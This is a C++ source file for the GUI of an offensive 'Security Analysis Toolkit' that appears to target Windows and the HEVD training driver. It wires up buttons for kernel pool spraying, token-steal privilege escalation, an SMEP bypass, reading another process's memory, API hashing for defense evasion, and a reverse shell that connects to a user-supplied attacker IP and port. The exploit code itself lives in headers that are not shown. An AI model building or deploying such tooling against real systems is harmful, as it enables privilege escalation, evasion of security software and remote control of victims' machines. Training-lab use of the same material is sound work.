#include "gui_manager.hpp"
#include "../include/advanced_kernel.hpp"
#include "../include/kernel_exploit.hpp"
#include "../include/sys_interact.hpp"
#include "../include/utils.hpp"
#include "../include/evasion.hpp"
#include "../include/network.hpp"
#include <imgui.h>
#include <iostream>

namespace ToolkitUI {
    GuiManager::GuiManager() {}
    GuiManager::~GuiManager() {}

    bool GuiManager::Initialize() {
        // Integration with GLFW/OpenGL would happen here
        std::cout << "[+] GUI Engine Initialized successfully.\n";
        return true;
    }

    void GuiManager::LogMessage(const std::string& message, int type) {
        logs.push_back({type, message});
        if (logs.size() > 100) logs.erase(logs.begin());
    }

    void GuiManager::RenderFrame() {
        // This is where the ImGui magic happens every frame
        ImGui::Begin("Security Analysis Toolkit v2.0", nullptr, ImGuiWindowFlags_NoCollapse);

        DrawMainSidebar();

        ImGui::SameLine();

        ImGui::BeginChild("MainContent", ImVec2(0, -200), true);
        switch (currentTab) {
            case 0: DrawHomeTab(); break;
            case 1: DrawKernelTab(); break;
            case 2: DrawSysInteractTab(); break;
            case 3: DrawCryptoTab(); break;
            case 4: DrawEvasionTab(); break;
            case 5: DrawNetworkTab(); break;
        }
        ImGui::EndChild();

        DrawLogConsole();

        ImGui::End();
    }

    void GuiManager::DrawMainSidebar() {
        ImGui::BeginChild("Sidebar", ImVec2(150, 0), true);
        if (ImGui::Button("Home", ImVec2(130, 40))) currentTab = 0;
        if (ImGui::Button("Kernel Lab", ImVec2(130, 40))) currentTab = 1;
        if (ImGui::Button("Sys Interact", ImVec2(130, 40))) currentTab = 2;
        if (ImGui::Button("Crypto Lab", ImVec2(130, 40))) currentTab = 3;
        if (ImGui::Button("Evasion Lab", ImVec2(130, 40))) currentTab = 4;
        if (ImGui::Button("Network Lab", ImVec2(130, 40))) currentTab = 5;
        ImGui::EndChild();
    }

    void GuiManager::DrawHomeTab() {
        ImGui::TextColored(ImVec4(0, 1, 1, 1), "Welcome to Security Toolkit GUI");
        ImGui::Separator();
        ImGui::Text("System: Windows 11 x64");
        ImGui::Text("Status: %s", "Driver HEVD Detected");
        ImGui::Spacing();
        ImGui::Text("Use the sidebar to navigate to specific labs.");
    }

    void GuiManager::DrawKernelTab() {
        ImGui::Text("Kernel Exploitation Lab");
        ImGui::Separator();

        if (ImGui::Button("Spray Kernel Pool", ImVec2(200, 30))) {
            AdvancedKernel::PoolManager::spray_pool(1000, 0x1000);
            LogMessage("Pool spray initiated...", 0);
        }

        if (ImGui::Button("Execute Token Steal", ImVec2(200, 30))) {
            KernelExploit::run_lpe_exploit();
            LogMessage("Attempting Token Steal...", 1);
        }

        if (ImGui::Button("Modern Attack (SMEP Bypass)", ImVec2(200, 30))) {
            AdvancedKernel::run_modern_attack();
            LogMessage("Launching Modern Attack...", 1);
        }
    }

    void GuiManager::DrawSysInteractTab() {
        ImGui::Text("System Interaction");
        ImGui::Separator();

        ImGui::InputText("Process ID", processSearchBuf, 128);
        if (ImGui::Button("Read Process Memory")) {
            DWORD pid = std::stoul(processSearchBuf);
            std::vector<uint8_t> buf;
            if (SysInteract::read_process_memory(pid, 0x400000, buf, 64)) {
                LogMessage("Memory read successful for PID " + std::to_string(pid), 0);
            } else {
                LogMessage("Memory read failed!", 2);
            }
        }
    }

    void GuiManager::DrawCryptoTab() {
        ImGui::Text("Cryptography Testing Lab");
        ImGui::Separator();
        ImGui::Text("Coming soon: Visual XOR and Entropy Analyzer");
    }

    void GuiManager::DrawEvasionTab() {
        ImGui::Text("Defense Evasion Lab");
        ImGui::Separator();
        
        static char funcName[64] = "VirtualAlloc";
        ImGui::InputText("Function Name", funcName, 64);
        if (ImGui::Button("Calculate API Hash", ImVec2(200, 30))) {
            uint32_t hash = DefenseEvasion::calculate_hash(funcName);
            LogMessage("Hash for " + std::string(funcName) + " is: 0x" + std::to_string(hash), 0);
        }
        
        ImGui::Spacing();
        if (ImGui::Button("Secure Wipe Memory", ImVec2(200, 30))) {
            // Simulate wiping a buffer
            int dummyData[10] = {1,2,3,4,5,6,7,8,9,10};
            DefenseEvasion::secure_wipe(dummyData, sizeof(dummyData));
            LogMessage("Memory successfully wiped.", 0);
        }
    }

    void GuiManager::DrawNetworkTab() {
        ImGui::Text("Remote Control Lab");
        ImGui::Separator();
        
        ImGui::InputText("Attacker IP", attackerIpBuf, 64);
        ImGui::InputText("Attacker Port", attackerPortBuf, 16);
        
        if (ImGui::Button("Connect & Start Reverse Shell", ImVec2(250, 30))) {
            int port = std::stoi(attackerPortBuf);
            RemoteControl::ReverseShell shell(attackerIpBuf, port);
            if (shell.connect_to_attacker()) {
                LogMessage("Reverse Shell Connected!", 0);
                // Execute in background thread in a real app
                shell.execute_shell();
            } else {
                LogMessage("Connection failed. Check IP/Port.", 2);
            }
        }
    }

    void GuiManager::DrawLogConsole() {
        ImGui::BeginChild("Console", ImVec2(0, 180), true);
        for (auto& log : logs) {
            ImVec4 color = ImVec4(1, 1, 1, 1); // White
            if (log.first == 1) color = ImVec4(1, 1, 0, 1); // Yellow
            if (log.first == 2) color = ImVec4(1, 0, 0, 1); // Red
            ImGui::TextColored(color, "[%s] %s", (log.first == 2 ? "ERROR" : "INFO"), log.second.c_str());
        }
        ImGui::EndChild();
    }

    bool GuiManager::ShouldClose() { return false; } // Managed by window close event
    void GuiManager::Shutdown() {}
}
